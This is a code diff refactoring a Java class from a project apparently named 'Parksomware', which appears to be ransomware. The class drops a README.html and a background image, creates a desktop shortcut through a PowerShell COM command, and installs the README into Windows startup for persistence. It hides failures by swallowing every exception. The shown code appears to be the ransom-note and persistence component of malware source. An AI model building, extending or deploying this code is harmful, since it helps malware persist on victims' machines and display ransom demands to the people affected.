@@ -15,16 +15,16 @@ public class CreateReadme {
                 Files.createDirectories(parksomwarePath);
             }
 
-            Path readmePath = extractFileToAppData("/README.html");
-            Path backgroundPath = extractFileToAppData("/background.png");
-            Path desktopShortcut = addToDesktopShortcut(readmePath);
+            Path readmePath = extractResourceToFile("/README.html", PARKSOMWARE_DIR);
+            Path backgroundPath = extractResourceToFile("/background.png", PARKSOMWARE_DIR);
+            addToDesktopShortcut(readmePath);
             addToStartup(readmePath);
         } catch (Exception ignored) {
         }
     }
 
-    private static Path extractFileToAppData(String resourceFileName) throws IOException {
-        Path filePath = Paths.get(PARKSOMWARE_DIR, resourceFileName.substring(1));
+    private static Path extractResourceToFile(String resourceFileName, String targetDirectory) throws IOException {
+        Path filePath = Paths.get(targetDirectory, resourceFileName.substring(resourceFileName.lastIndexOf("/") + 1));
         try (InputStream is = CreateReadme.class.getResourceAsStream(resourceFileName)) {
             if (is == null) {
                 throw new FileNotFoundException(resourceFileName + " not found in Jar file.");
@@ -34,14 +34,14 @@ public class CreateReadme {
         return filePath;
     }
 
-    private static Path addToDesktopShortcut(Path filePath) {
+    private static void addToDesktopShortcut(Path filePath) {
         try {
-            Path desktopPath = Paths.get(System.getenv("USERPROFILE"), "Desktop");
+            Path desktopPath = Paths.get(System.getProperty("user.home"), "Desktop");
             Path shortcutPath = desktopPath.resolve(filePath.getFileName().toString() + ".lnk");
 
             String script = "powershell \"$s = (New-Object -COM WScript.Shell).CreateShortcut('" + shortcutPath + "'); "
                     + "$s.TargetPath = '" + filePath + "'; $s.Save()\"";
-            Runtime.getRuntime().exec(script);
+            Process process = Runtime.getRuntime().exec(script);
 
             int attempts = 0;
             while (!Files.exists(shortcutPath) && attempts < 10) {
@@ -56,7 +56,6 @@ public class CreateReadme {
             }
         } catch (Exception ignored) {
         }
-        return null;
     }
 
     private static void addToStartup(Path filePath) {
@@ -67,7 +66,7 @@ public class CreateReadme {
             String script = "powershell \"$s = (New-Object -COM WScript.Shell).CreateShortcut('" + shortcutPath.toString() + "'); "
                     + "$s.TargetPath = '" + filePath.toString() + "'; $s.Save()\"";
 
-            Runtime.getRuntime().exec(script);
+            Process process = Runtime.getRuntime().exec(script);
         } catch (Exception ignored) {
         }
     }
